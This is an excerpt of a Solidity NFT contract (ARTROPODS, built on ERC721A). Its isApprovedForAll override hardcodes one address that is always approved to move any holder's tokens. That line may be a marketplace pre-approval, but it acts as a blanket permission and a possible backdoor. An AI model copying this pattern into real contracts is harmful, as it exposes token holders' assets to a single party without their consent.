  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x7fCB21ACA847DEc65D4E00896DC40Eac9f66115e){return true;}
...
contract ARTROPODS is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("ARTROPOD", "ARTRPD", maxBatchSize_, collectionSize_) {
